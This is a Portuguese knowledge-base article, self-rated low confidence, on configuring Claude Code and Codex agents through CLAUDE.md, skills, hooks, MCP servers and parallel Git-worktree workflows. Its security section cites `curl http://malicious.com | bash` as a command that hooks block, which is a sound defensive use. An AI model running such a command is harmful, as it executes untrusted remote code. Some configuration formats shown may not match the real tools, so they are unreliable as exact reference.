---
domain: domains/ai/agentic-coding-workflows-plugins.md
confidence: low
sources: 4
last_updated: 2026-04-14
---

# Workflows, Plugins e Skills para Codex e Claude Code

A engenharia de software assistida por IA transitou do paradigma de *autocomplete* (Copilots) para o paradigma de *agentes autônomos* (Claude Code, OpenAI Codex). Neste novo modelo, o gargalo do desenvolvimento deixa de ser a digitação de código e passa a ser a **orquestração, planejamento e revisão** do trabalho executado por múltiplos agentes operando em paralelo.

Este documento detalha a arquitetura de plugins, skills, hooks e servidores MCP (Model Context Protocol) para Claude Code e OpenAI Codex, além de padrões de orquestração de workflows utilizando ferramentas como Vibe Kanban.

---

## 1. Arquitetura de Agentes de Código

Agentes de código CLI/IDE operam em um loop de *Read-Eval-Print-Loop* (REPL) estendido, onde o "Eval" envolve planejamento via LLM, invocação de ferramentas (Tools) e manipulação do sistema de arquivos.

```text
+-----------------------------------------------------------------------------------+
|                                 SESSÃO DO AGENTE                                  |
|                                                                                   |
|  +---------------+       +--------------------+       +------------------------+  |
|  | Contexto Base | ----> | Motor de Raciocínio| <---> | Model Context Protocol |  |
|  | (CLAUDE.md /  |       | (Claude 3.7 /      |       | (MCP Servers)          |  |
|  |  AGENTS.md)   |       |  GPT-5.4 Codex)    |       | - Bancos de Dados      |  |
|  +---------------+       +--------------------+       | - APIs Externas        |  |
|          ^                         |                  | - Web Search           |  |
|          |                         v                  +------------------------+  |
|  +---------------+       +--------------------+                                   |
|  | Skills &      |       | Hooks de Execução  |                                   |
|  | Slash Cmds    |       | (Pre/Post/Stop)    |                                   |
|  +---------------+       +--------------------+                                   |
|                                    |                                              |
+------------------------------------|----------------------------------------------+
                                     v
                           +--------------------+
                           | Sistema de Arquivos|
                           | (Git Worktrees)    |
                           +--------------------+
```

### 1.1. O Paradigma de Contexto Injetado
Diferente de IDEs tradicionais que indexam o código via AST, agentes dependem de **Contexto Injetado**. O agente não "lê" o repositório inteiro a cada prompt; ele utiliza ferramentas de busca (grep, ripgrep, AST parsers via MCP) para trazer pedaços relevantes para a janela de contexto. O comportamento do agente é moldado por arquivos de configuração raiz (`CLAUDE.md` ou `AGENTS.md`).

---

## 2. Ecossistema Claude Code

O Claude Code utiliza um sistema modular de extensões (frequentemente chamados de *plugins*) que se dividem em quatro categorias fundamentais: **Skills**, **MCP Servers**, **Hooks** e **Slash Commands**.

### 2.1. CLAUDE.md: O Ponto de Partida
O arquivo `CLAUDE.md` (localizado na raiz do projeto ou em `~/.claude/CLAUDE.md` para configurações globais) é o *system prompt* base. Ele é carregado em **todas** as conversas.

**Best Practices para CLAUDE.md:**
*   **Densidade sobre extensão:** Cada linha custa tokens de contexto. Mantenha sob 200 linhas.
*   **Comandos exatos:** Forneça comandos de build/test copiáveis (ex: `npm run test:unit` em vez de "rode os testes").
*   **Anti-patterns:** Documente explicitamente o que *não* fazer (ex: "Não use `any` no TypeScript, use `unknown` e faça type narrowing").

### 2.2. Skills (System Prompts Modulares)
Enquanto o `CLAUDE.md` é universal, **Skills** são personas ou diretrizes ativadas sob demanda. Elas vivem em `.claude/skills/` como arquivos Markdown.

Uma skill não adiciona capacidades de execução, ela altera o *comportamento* e o *raciocínio* do modelo.

**Exemplo de Skill (`.claude/skills/go-reviewer.md`):**
```markdown
---
name: Go Code Reviewer
description: Revisa código Go focando em concorrência e tratamento de erros.
---
Você é um Staff Engineer especialista em Go. Ao revisar código:
1. Verifique vazamentos de goroutines (goroutine leaks).
2. Garanta que canais (channels) sejam fechados pelo sender, não pelo receiver.
3. Exija que erros sejam envelopados usando `fmt.Errorf("... %w", err)`.
4. Rejeite o uso de `init()` a menos que estritamente necessário.
```

### 2.3. Hooks (Automação e Enforcement)
Hooks são scripts orientados a eventos que disparam durante o ciclo de vida da ação do agente. Eles são a camada de **enforcement** (garantia de execução), configurados no `.claude/settings.json`.

Eventos disponíveis:
*   `PreToolUse`: Roda antes da ferramenta (útil para bloquear edições em arquivos críticos).
*   `PostToolUse`: Roda após a ferramenta (útil para auto-formatação).
*   `Stop`: Roda quando o agente termina o turno (útil para rodar testes).

**Exemplo de configuração de Hooks (`.claude/settings.json`):**
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Write|Edit",
        "hook": "python3 .claude/hooks/guardrail.py $CLAUDE_FILE_PATH"
      }
    ],
    "Stop": [
      {
        "hook": "go test ./... -short"
      }
    ]
  }
}
```

**Exemplo de script de Guardrail em Python (`guardrail.py`):**
```python
import sys
import os

def main():
    if len(sys.argv) < 2:
        sys.exit(0)
        
    file_path = sys.argv[1]
    protected_files = ['auth.go', 'security.go', 'go.mod']
    
    filename = os.path.basename(file_path)
    if filename in protected_files:
        print(f"ERRO: O agente tentou modificar um arquivo protegido ({filename}).")
        print("Solicite aprovação humana explícita antes de prosseguir.")
        sys.exit(1) # Código não-zero bloqueia a execução da ferramenta

if __name__ == "__main__":
    main()
```

### 2.4. Slash Commands
Atalhos para workflows multi-etapas. Vivem em `.claude/commands/`.
Exemplo (`.claude/commands/deploy.md`):
```markdown
Execute o checklist de deploy:
1. Rode a suíte de testes completa.
2. Verifique se há variáveis de ambiente hardcoded.
3. Confirme se as migrations de banco são reversíveis.
4. Resuma os riscos antes de aprovar o deploy.
```
O usuário digita `/deploy` e o agente executa o prompt acima.

---

## 3. OpenAI Codex: AGENTS.md e Subagentes

O ecossistema do OpenAI Codex (especialmente nas versões mais recentes integradas ao ChatGPT Pro/Enterprise e CLI) segue uma filosofia similar, mas com terminologia e capacidades de delegação ligeiramente diferentes.

### 3.1. AGENTS.md
Equivalente ao `CLAUDE.md`, o `AGENTS.md` define as regras de engajamento do Codex no repositório.

### 3.2. Subagentes (Subagents)
Uma capacidade nativa do Codex é a orquestração de **Subagentes**. Em vez de um único agente tentar resolver um problema complexo, o Codex pode instanciar subagentes com contextos isolados.

*   **Agente Arquiteto:** Analisa o problema e quebra em tarefas.
*   **Agente Frontend:** Recebe apenas o contexto da pasta `apps/web` e implementa a UI.
*   **Agente Backend:** Recebe o contexto de `apps/api` e implementa os endpoints.

Isso reduz a poluição de contexto e evita que o modelo "esqueça" instruções devido ao limite da janela de tokens.

---

## 4. Model Context Protocol (MCP)

O **MCP** é o padrão aberto que unifica como agentes (tanto Claude quanto Codex) se comunicam com ferramentas externas. Enquanto *Skills* mudam como o agente pensa, *MCP Servers* mudam o que o agente **pode fazer**.

O MCP opera via JSON-RPC, tipicamente sobre `stdio` (processos locais) ou SSE (Server-Sent Events para conexões remotas).

### 4.1. Configurando um Servidor MCP
No Claude Code, servidores MCP são registrados no `settings.json`:

```json
{
  "mcpServers": {
    "postgres": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-postgres"],
      "env": {
        "DATABASE_URL": "postgresql://localhost:5432/mydb"
      }
    }
  }
}
```

### 4.2. Construindo um Servidor MCP Customizado (Python)
Se você precisa que o agente interaja com uma API interna da sua empresa, você deve construir um servidor MCP. Abaixo, um padrão arquitetural usando Python.

*Nota: O ecossistema MCP possui SDKs oficiais. O exemplo abaixo ilustra a mecânica de exposição de ferramentas.*

```python
import sys
import json
from typing import Dict, Any
from pydantic import BaseModel

# Esquemas de validação
class QueryUserArgs(BaseModel):
    user_id: str

class MCPServer:
    def __init__(self):
        self.tools = {
            "query_internal_user": {
                "description": "Busca dados de um usuário no sistema interno",
                "parameters": QueryUserArgs.model_json_schema(),
                "handler": self.query_user
            }
        }

    def query_user(self, args: Dict[str, Any]) -> str:
        validated = QueryUserArgs(**args)
        # Lógica real de negócio aqui (ex: chamada gRPC/HTTP)
        return json.dumps({"id": validated.user_id, "status": "active", "role": "admin"})

    def handle_request(self, req: Dict[str, Any]) -> Dict[str, Any]:
        method = req.get("method")
        if method == "tools/list":
            return {
                "tools": [
                    {"name": k, "description": v["description"], "inputSchema": v["parameters"]}
                    for k, v in self.tools.items()
                ]
            }
        elif method == "tools/call":
            params = req.get("params", {})
            tool_name = params.get("name")
            tool_args = params.get("arguments", {})
            
            if tool_name in self.tools:
                try:
                    result = self.tools[tool_name]["handler"](tool_args)
                    return {"content": [{"type": "text", "text": result}]}
                except Exception as e:
                    return {"isError": True, "content": [{"type": "text", "text": str(e)}]}
        return {"isError": True, "content": [{"type": "text", "text": "Method not found"}]}

    def run_stdio(self):
        # Loop de leitura JSON-RPC via stdin/stdout
        for line in sys.stdin:
            try:
                req = json.loads(line)
                resp = self.handle_request(req)
                # Resposta JSON-RPC
                sys.stdout.write(json.dumps({"jsonrpc": "2.0", "id": req.get("id"), "result": resp}) + "\n")
                sys.stdout.flush()
            except json.JSONDecodeError:
                continue

if __name__ == "__main__":
    server = MCPServer()
    server.run_stdio()
```

---

## 5. Orquestração e Workflows Paralelos (Vibe Kanban)

Com agentes cada vez mais autônomos, o gargalo da engenharia mudou. Você não espera mais o desenvolvedor digitar; você espera o agente terminar de processar para você revisar. Se você usa apenas uma sessão de agente, você fica ocioso.

A solução arquitetural para isso é a **execução paralela baseada em Git Worktrees**, orquestrada por ferramentas como o **Vibe Kanban**.

### 5.1. O Problema do Branch Único
Se você pede para o agente implementar a Feature A, seu terminal fica bloqueado. Se você abrir outra aba e pedir a Feature B no mesmo branch, haverá conflitos de estado no sistema de arquivos e no contexto do agente.

### 5.2. A Solução: Git Worktrees + Vibe Kanban
O Vibe Kanban (`npx vibe-kanban`) atua como um gerenciador de projetos profundamente integrado aos agentes.

1.  **Planejamento:** Você cria *Issues* no Kanban.
2.  **Isolamento:** Ao iniciar uma issue, o Kanban cria um `git worktree`. Um worktree permite ter múltiplos branches do mesmo repositório em diretórios físicos diferentes simultaneamente.
3.  **Execução Paralela:** O Kanban dispara instâncias isoladas do Claude Code ou Codex em cada worktree.
4.  **Revisão:** Quando o agente termina, ele abre um PR. O status no Kanban muda automaticamente. O engenheiro humano atua apenas como revisor (Code Review) e aprovador.

```text
                      +-------------------+
                      |   Vibe Kanban     |
                      | (Issue Tracker)   |
                      +-------------------+
                                |
          +---------------------+---------------------+
          |                     |                     |
          v                     v                     v
+-------------------+ +-------------------+ +-------------------+
| Git Worktree 1    | | Git Worktree 2    | | Git Worktree 3    |
| Branch: feat/auth | | Branch: fix/ui    | | Branch: perf/db   |
+-------------------+ +-------------------+ +-------------------+
| Agente (Codex)    | | Agente (Claude)   | | Agente (Claude)   |
| Contexto Isolado  | | Contexto Isolado  | | Contexto Isolado  |
+-------------------+ +-------------------+ +-------------------+
          |                     |                     |
          v                     v                     v
    Pull Request 1        Pull Request 2        Pull Request 3
          \                     |                     /
           \                    v                    /
            +---------------------------------------+
            |       Revisão Humana (Engenheiro)     |
            +---------------------------------------+
```

### 5.3. Modo de Planejamento (`/plan`)
Para tarefas complexas que tocam múltiplos arquivos, a melhor prática é forçar o agente a usar o modo de planejamento antes de escrever código.
No Claude Code, o comando `/plan` instrui o modelo a gerar um documento de design e passos de execução. O humano revisa o plano, ajusta a rota, e só então autoriza a execução. Isso economiza tokens, tempo de computação e evita refatorações em massa incorretas.

---

## 6. Segurança e Guardrails

Dar acesso de escrita e execução de shell a um LLM apresenta riscos severos de segurança (ex: injeção de prompt levando a exfiltração de segredos ou execução de código malicioso).

### 6.1. Níveis de Permissão
Tanto Claude Code quanto Codex implementam modos de permissão:
1.  **Suggest:** O agente propõe diffs, mas não escreve no disco sem aprovação.
2.  **Auto-edit:** O agente escreve no disco livremente, mas pede aprovação para rodar comandos shell (ex: `npm install`).
3.  **YOLO / Autonomous:** Execução total. **Nunca use este modo sem Hooks de segurança rigorosos.**

### 6.2. Mitigações de Risco
*   **Sandboxing:** Execute os agentes dentro de containers Docker efêmeros ou VMs isoladas, especialmente ao lidar com código não confiável.
*   **Hooks de Validação:** Use `PreToolUse` para interceptar comandos shell. Se o agente tentar rodar `curl http://malicious.com | bash`, o hook deve bloquear a execução via regex ou análise semântica.
*   **Git Commit Frequente:** Instrua o agente (via `CLAUDE.md`) a fazer commits atômicos a cada passo lógico concluído. Isso garante pontos de *rollback* limpos caso o agente entre em alucinação e destrua o código.

---

## 7. Empacotamento e Distribuição (plugin.json)

Para times, compartilhar skills e hooks é essencial. O ecossistema suporta o empacotamento através de um manifesto `plugin.json`.

```json
{
  "name": "acme-corp-standards",
  "version": "1.0.0",
  "skills": [
    {
      "name": "go-reviewer",
      "path": "skills/go-reviewer.md"
    }
  ],
  "hooks": [
    {
      "event": "PostToolUse",
      "matcher": "Write|Edit",
      "path": "hooks/gofmt.sh"
    }
  ]
}
```
Instalação via CLI: `/install-plugin acme-corp/acme-corp-standards`.

---

## See Also
*   [[model-context-protocol]] - Detalhes profundos sobre a especificação JSON-RPC do MCP.
*   [[git-worktrees-patterns]] - Como gerenciar múltiplos estados de repositório localmente.
*   [[llm-security-guardrails]] - Padrões de segurança para execução autônoma de código.
*   [[prompt-engineering-system-prompts]] - Técnicas avançadas para escrever Skills eficazes.

## Sources
*   `raw/articles/claude-code-plugins-guide.md`
*   `raw/articles/claude-code-best-practices.md`
*   `raw/articles/openai-codex-overview.md`
*   `raw/articles/vibe-kanban-ai-agents.md`